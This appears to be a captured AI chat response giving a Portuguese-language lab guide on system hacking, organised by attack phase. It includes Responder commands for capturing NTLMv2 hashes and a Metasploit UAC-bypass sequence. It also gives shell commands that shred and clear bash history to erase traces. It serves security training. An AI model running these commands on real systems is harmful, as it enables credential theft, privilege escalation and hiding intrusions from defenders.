<div _ngcontent-ng-c2673589256="" inline-copy-host="" class="markdown markdown-main-panel stronger enable-updated-hr-color" id="model-response-message-contentr_df60069dadb55d52" aria-live="polite" aria-busy="false" dir="ltr" style="--animation-duration: 400ms; --fade-animation-function: linear;"><h1 data-path-to-node="0">üìö M√≥dulo 06: Invas√£o de Sistemas (System Hacking) - Guia de Laborat√≥rio</h1><hr data-path-to-node="1"><h2 data-path-to-node="2">1. Vis√£o Geral e Fases da Invas√£o de Sistemas</h2><ul data-path-to-node="3"><li><p data-path-to-node="3,0,0"><b>Invas√£o de Sistemas</b> √© o processo de acessar e obter controle sobre o sistema operacional de um alvo, utilizando as vulnerabilidades e informa√ß√µes coletadas nas fases anteriores (Scanning e Enumera√ß√£o).</p></li><li><p data-path-to-node="3,1,0">O objetivo principal √© a <b>obten√ß√£o e manuten√ß√£o do acesso</b> (Persistence) ao sistema, bem como a <b>escala de privil√©gios</b> para obter controle administrativo.</p></li></ul><div class="horizontal-scroll-wrapper"><div class="table-block-component"><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><table-block _nghost-ng-c984690523="" class="ng-star-inserted"><div _ngcontent-ng-c984690523="" class="table-block has-export-button"><div _ngcontent-ng-c984690523="" not-end-of-paragraph="" class="table-content not-end-of-paragraph" jslog="275421;track:impression,attention" data-hveid="0" decode-data-ved="1" data-ved="0CAAQ3ecQahgKEwiGw7zijJ-RAxUAAAAAHQAAAAAQnhA"><table data-path-to-node="4"><thead><tr><td><span data-path-to-node="4,0,0,0">Fase</span></td><td><span data-path-to-node="4,0,1,0">Objetivo</span></td><td><span data-path-to-node="4,0,2,0">Exemplos de A√ß√£o</span></td></tr></thead><tbody><tr><td><span data-path-to-node="4,1,0,0"><b>Gaining Access</b> (Obten√ß√£o de Acesso)</span></td><td><span data-path-to-node="4,1,1,0">Entrar no sistema, frequentemente atrav√©s de credenciais roubadas ou explora√ß√£o.</span></td><td><span data-path-to-node="4,1,2,0">Ataques de Passwords, Explora√ß√£o de Buffer Overflow.</span></td></tr><tr><td><span data-path-to-node="4,2,0,0"><b>Escalating Privileges</b> (Escalada de Privil√©gios)</span></td><td><span data-path-to-node="4,2,1,0">Aumentar o n√≠vel de permiss√£o (ex: de usu√°rio para Administrador/System).</span></td><td><span data-path-to-node="4,2,2,0">Bypass de UAC (Windows), Explora√ß√£o de falhas de kernel.</span></td></tr><tr><td><span data-path-to-node="4,3,0,0"><b>Executing Applications</b> (Execu√ß√£o de Aplica√ß√µes)</span></td><td><span data-path-to-node="4,3,1,0">Instalar e executar malware (ex: RATs, Keyloggers) para manter o controle.</span></td><td><span data-path-to-node="4,3,2,0">Cria√ß√£o de Shell Reversa, Implanta√ß√£o de Trojans (njRAT).</span></td></tr><tr><td><span data-path-to-node="4,4,0,0"><b>Covering Tracks</b> (Cobrindo Pistas)</span></td><td><span data-path-to-node="4,4,1,0">Remover evid√™ncias da intrus√£o para evitar a detec√ß√£o.</span></td><td><span data-path-to-node="4,4,2,0">Limpar logs, apagar hist√≥rico de comandos.</span></td></tr></tbody></table></div><div _ngcontent-ng-c984690523="" hide-from-message-actions="" class="table-footer hide-from-message-actions ng-star-inserted"><button _ngcontent-ng-c984690523="" mat-button="" class="mdc-button mat-mdc-button-base export-sheets-button-container mat-mdc-button mat-unthemed ng-star-inserted" mat-ripple-loader-uninitialized="" mat-ripple-loader-class-name="mat-mdc-button-ripple" jslog="184701;track:generic_click,impression;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,null,null,null,null,null,1,null,null,null,0]]"><span class="mat-mdc-button-persistent-ripple mdc-button__ripple"></span><span class="mdc-button__label"><span _ngcontent-ng-c984690523="" class="export-sheets-button"><span _ngcontent-ng-c984690523="" class="export-sheets-icon"><mat-icon _ngcontent-ng-c984690523="" role="img" fonticon="drive_spreadsheet" class="mat-icon notranslate google-symbols mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font" data-mat-icon-name="drive_spreadsheet"></mat-icon></span><span _ngcontent-ng-c984690523="">Exportar para as Planilhas</span></span></span><span class="mat-focus-indicator"></span><span class="mat-mdc-button-touch-target"></span></button><!----><button _ngcontent-ng-c984690523="" mat-icon-button="" mattooltip="Copiar tabela" aria-label="Copiar tabela" data-test-id="copy-table-button" class="mdc-icon-button mat-mdc-icon-button mat-mdc-button-base mat-mdc-tooltip-trigger copy-button mat-unthemed ng-star-inserted" mat-ripple-loader-uninitialized="" mat-ripple-loader-class-name="mat-mdc-button-ripple" mat-ripple-loader-centered="" jslog="276666;track:generic_click,impression;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,null,null,null,null,null,1,null,null,null,0]]"><span class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c984690523="" role="img" fonticon="content_copy" class="mat-icon notranslate gds-icon-l google-symbols mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font" data-mat-icon-name="content_copy"></mat-icon><span class="mat-focus-indicator"></span><span class="mat-mdc-button-touch-target"></span></button><!----><!----><!----></div><!----></div><!----></table-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element></div></div><hr data-path-to-node="5"><h2 data-path-to-node="6">2. Tarefas de Laborat√≥rio: Obten√ß√£o de Acesso (Gaining Access)</h2><h3 data-path-to-node="7">2.1. üîë Ataques Online de Senhas e Hashes (Responder)</h3><ul data-path-to-node="8"><li><p data-path-to-node="8,0,0"><b><i>Objetivo:</i></b> Capturar hashes de senhas (ex: NTLMv2) na rede, explorando falhas nos protocolos de resolu√ß√£o de nomes (como LLMNR/NBT-NS) e usando a ferramenta <b>Responder</b>.</p></li><li><p data-path-to-node="8,1,0"><b><i>A√ß√£o:</i></b> O atacante simula ser um servidor leg√≠timo para o qual o sistema v√≠tima envia o hash de sua senha em resposta a uma requisi√ß√£o n√£o resolvida.</p></li></ul><p data-path-to-node="9"><b><i>Comando de Exemplo:</i></b></p><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><code-block _nghost-ng-c2766598292="" class="ng-tns-c2766598292-207 ng-star-inserted" style=""><!----><!----><div _ngcontent-ng-c2766598292="" class="code-block ng-tns-c2766598292-207 ng-animate-disabled ng-trigger ng-trigger-codeBlockRevealAnimation" jslog="223238;track:impression,attention;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,&quot;rc_6abb3d02278ad8df&quot;,null,null,&quot;pt&quot;,null,1,null,null,1,0]]" style="display: block;" data-hveid="0" decode-data-ved="1" data-ved="0CAAQhtANahgKEwiGw7zijJ-RAxUAAAAAHQAAAAAQoRA"><div _ngcontent-ng-c2766598292="" class="code-block-decoration header-formatted gds-title-s ng-tns-c2766598292-207 ng-star-inserted" style=""><span _ngcontent-ng-c2766598292="" class="ng-tns-c2766598292-207">Bash</span><div _ngcontent-ng-c2766598292="" class="buttons ng-tns-c2766598292-207 ng-star-inserted"><button _ngcontent-ng-c2766598292="" aria-label="Copiar o c√≥digo" mat-icon-button="" mattooltip="Copiar o c√≥digo" class="mdc-icon-button mat-mdc-icon-button mat-mdc-button-base mat-mdc-tooltip-trigger copy-button ng-tns-c2766598292-207 mat-unthemed ng-star-inserted" mat-ripple-loader-uninitialized="" mat-ripple-loader-class-name="mat-mdc-button-ripple" mat-ripple-loader-centered="" jslog="179062;track:generic_click,impression;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,&quot;rc_6abb3d02278ad8df&quot;,null,null,&quot;pt&quot;,null,1,null,null,1,0]];mutable:true"><span class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c2766598292="" role="img" fonticon="content_copy" class="mat-icon notranslate google-symbols mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font" data-mat-icon-name="content_copy"></mat-icon><span class="mat-focus-indicator"></span><span class="mat-mdc-button-touch-target"></span></button><!----><!----></div><!----></div><!----><div _ngcontent-ng-c2766598292="" class="formatted-code-block-internal-container ng-tns-c2766598292-207"><div _ngcontent-ng-c2766598292="" class="animated-opacity ng-tns-c2766598292-207"><pre _ngcontent-ng-c2766598292="" class="ng-tns-c2766598292-207"><code _ngcontent-ng-c2766598292="" role="text" data-test-id="code-content" class="code-container formatted ng-tns-c2766598292-207"><span class="hljs-comment"># Iniciar o Responder na interface de rede do atacante (ex: eth0)</span>
sudo responder -I eth0 -v
</code></pre><!----></div></div></div><!----><!----></code-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element><ul data-path-to-node="11"><li><p data-path-to-node="11,0,0"><b>Pr√≥ximo Passo:</b> O hash capturado √© ent√£o usado em um ataque offline (ex: Hashcat) para obter a senha em texto simples.</p></li></ul><h3 data-path-to-node="12">2.2. üí• Explora√ß√£o de Buffer Overflow (Stack-Based)</h3><ul data-path-to-node="13"><li><p data-path-to-node="13,0,0"><b><i>Objetivo:</i></b> Injetar e executar c√≥digo malicioso (shellcode) no sistema, explorando uma falha de software que permite a <b>sobrescrita do ponteiro EIP</b> (Extended Instruction Pointer).</p></li><li><p data-path-to-node="13,1,0"><b><i>A√ß√£o:</i></b> Enviar uma quantidade excessiva de dados para um programa vulner√°vel, fazendo com que o buffer transborde e o ponteiro de instru√ß√£o seja controlado.</p></li></ul><p data-path-to-node="14"><b><i>Ferramentas Comuns:</i></b> Spike, Immunity Debugger, Metasploit.</p><hr data-path-to-node="15"><h2 data-path-to-node="16">3. Tarefas de Laborat√≥rio: Escalada de Privil√©gios</h2><h3 data-path-to-node="17">3.1. üõ°Ô∏è Bypass de UAC (User Account Control) no Windows</h3><ul data-path-to-node="18"><li><p data-path-to-node="18,0,0"><b><i>Objetivo:</i></b> Executar c√≥digo com privil√©gios administrativos, mesmo quando o UAC est√° ativado, explorando falhas em aplica√ß√µes nativas do Windows.</p></li><li><p data-path-to-node="18,1,0"><b><i>A√ß√£o:</i></b> Usar m√≥dulos do Metasploit, como o <code>bypassuac_fodhelper</code>, que exploram a forma como o UAC eleva certos processos.</p></li></ul><p data-path-to-node="19"><b><i>Comandos Metasploit de Exemplo:</i></b></p><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><code-block _nghost-ng-c2766598292="" class="ng-tns-c2766598292-208 ng-star-inserted" style=""><!----><!----><div _ngcontent-ng-c2766598292="" class="code-block ng-tns-c2766598292-208 ng-animate-disabled ng-trigger ng-trigger-codeBlockRevealAnimation" jslog="223238;track:impression,attention;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,&quot;rc_6abb3d02278ad8df&quot;,null,null,&quot;pt&quot;,null,1,null,null,1,0]]" style="display: block;" data-hveid="0" decode-data-ved="1" data-ved="0CAAQhtANahgKEwiGw7zijJ-RAxUAAAAAHQAAAAAQohA"><div _ngcontent-ng-c2766598292="" class="code-block-decoration header-formatted gds-title-s ng-tns-c2766598292-208 ng-star-inserted" style=""><span _ngcontent-ng-c2766598292="" class="ng-tns-c2766598292-208">Bash</span><div _ngcontent-ng-c2766598292="" class="buttons ng-tns-c2766598292-208 ng-star-inserted"><button _ngcontent-ng-c2766598292="" aria-label="Copiar o c√≥digo" mat-icon-button="" mattooltip="Copiar o c√≥digo" class="mdc-icon-button mat-mdc-icon-button mat-mdc-button-base mat-mdc-tooltip-trigger copy-button ng-tns-c2766598292-208 mat-unthemed ng-star-inserted" mat-ripple-loader-uninitialized="" mat-ripple-loader-class-name="mat-mdc-button-ripple" mat-ripple-loader-centered="" jslog="179062;track:generic_click,impression;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,&quot;rc_6abb3d02278ad8df&quot;,null,null,&quot;pt&quot;,null,1,null,null,1,0]];mutable:true"><span class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c2766598292="" role="img" fonticon="content_copy" class="mat-icon notranslate google-symbols mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font" data-mat-icon-name="content_copy"></mat-icon><span class="mat-focus-indicator"></span><span class="mat-mdc-button-touch-target"></span></button><!----><!----></div><!----></div><!----><div _ngcontent-ng-c2766598292="" class="formatted-code-block-internal-container ng-tns-c2766598292-208"><div _ngcontent-ng-c2766598292="" class="animated-opacity ng-tns-c2766598292-208"><pre _ngcontent-ng-c2766598292="" class="ng-tns-c2766598292-208"><code _ngcontent-ng-c2766598292="" role="text" data-test-id="code-content" class="code-container formatted ng-tns-c2766598292-208"><span class="hljs-comment"># Entrar no Metasploit e usar o m√≥dulo de bypass de UAC</span>
use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_fodhelper

<span class="hljs-comment"># Definir a sess√£o Meterpreter j√° obtida</span>
<span class="hljs-built_in">set</span> SESSION 1

<span class="hljs-comment"># Executar o exploit para obter uma nova sess√£o com privil√©gios elevados</span>
run
</code></pre><!----></div></div></div><!----><!----></code-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element><hr data-path-to-node="21"><h2 data-path-to-node="22">4. Tarefas de Laborat√≥rio: Cobrindo Pistas (Covering Tracks)</h2><h3 data-path-to-node="23">4.1. üóëÔ∏è Limpeza de Logs e Hist√≥rico de Comandos (Linux)</h3><ul data-path-to-node="24"><li><p data-path-to-node="24,0,0"><b><i>Objetivo:</i></b> Eliminar evid√™ncias da atividade do atacante nos logs do sistema e no hist√≥rico de comandos da shell.</p></li><li><p data-path-to-node="24,1,0"><b><i>A√ß√£o:</i></b> Utilizar comandos para sobrescrever e limpar arquivos de hist√≥rico.</p></li></ul><p data-path-to-node="25"><b><i>Comandos de Exemplo (BASH Shell):</i></b></p><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><code-block _nghost-ng-c2766598292="" class="ng-tns-c2766598292-209 ng-star-inserted" style=""><!----><!----><div _ngcontent-ng-c2766598292="" class="code-block ng-tns-c2766598292-209 ng-animate-disabled ng-trigger ng-trigger-codeBlockRevealAnimation" jslog="223238;track:impression,attention;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,&quot;rc_6abb3d02278ad8df&quot;,null,null,&quot;pt&quot;,null,1,null,null,1,0]]" style="display: block;" data-hveid="0" decode-data-ved="1" data-ved="0CAAQhtANahgKEwiGw7zijJ-RAxUAAAAAHQAAAAAQoxA"><div _ngcontent-ng-c2766598292="" class="code-block-decoration header-formatted gds-title-s ng-tns-c2766598292-209 ng-star-inserted" style=""><span _ngcontent-ng-c2766598292="" class="ng-tns-c2766598292-209">Bash</span><div _ngcontent-ng-c2766598292="" class="buttons ng-tns-c2766598292-209 ng-star-inserted"><button _ngcontent-ng-c2766598292="" aria-label="Copiar o c√≥digo" mat-icon-button="" mattooltip="Copiar o c√≥digo" class="mdc-icon-button mat-mdc-icon-button mat-mdc-button-base mat-mdc-tooltip-trigger copy-button ng-tns-c2766598292-209 mat-unthemed ng-star-inserted" mat-ripple-loader-uninitialized="" mat-ripple-loader-class-name="mat-mdc-button-ripple" mat-ripple-loader-centered="" jslog="179062;track:generic_click,impression;BardVeMetadataKey:[[&quot;r_df60069dadb55d52&quot;,&quot;c_d821f286710ba78c&quot;,null,&quot;rc_6abb3d02278ad8df&quot;,null,null,&quot;pt&quot;,null,1,null,null,1,0]];mutable:true"><span class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c2766598292="" role="img" fonticon="content_copy" class="mat-icon notranslate google-symbols mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font" data-mat-icon-name="content_copy"></mat-icon><span class="mat-focus-indicator"></span><span class="mat-mdc-button-touch-target"></span></button><!----><!----></div><!----></div><!----><div _ngcontent-ng-c2766598292="" class="formatted-code-block-internal-container ng-tns-c2766598292-209"><div _ngcontent-ng-c2766598292="" class="animated-opacity ng-tns-c2766598292-209"><pre _ngcontent-ng-c2766598292="" class="ng-tns-c2766598292-209"><code _ngcontent-ng-c2766598292="" role="text" data-test-id="code-content" class="code-container formatted ng-tns-c2766598292-209"><span class="hljs-comment"># 1. Sobrescreve o arquivo .bash_history com dados aleat√≥rios, dificultando a recupera√ß√£o.</span>
shred ~/.bash_history

<span class="hljs-comment"># 2. Limpa o conte√∫do do arquivo de hist√≥rico, deixando-o vazio.</span>
cat /dev/null &gt; ~/.bash_history

<span class="hljs-comment"># 3. Limpa o hist√≥rico de comandos da sess√£o atual na mem√≥ria (sem afetar o arquivo).</span>
<span class="hljs-built_in">history</span> -c

<span class="hljs-comment"># Comando combinado (destr√≥i o arquivo, limpa o arquivo, limpa a mem√≥ria e sai do terminal)</span>
shred ~/.bash_history &amp;&amp; cat /dev/null &gt; .bash_history &amp;&amp; <span class="hljs-built_in">history</span> -c &amp;&amp; <span class="hljs-built_in">exit</span>
</code></pre><!----></div></div></div><!----><!----></code-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element></div>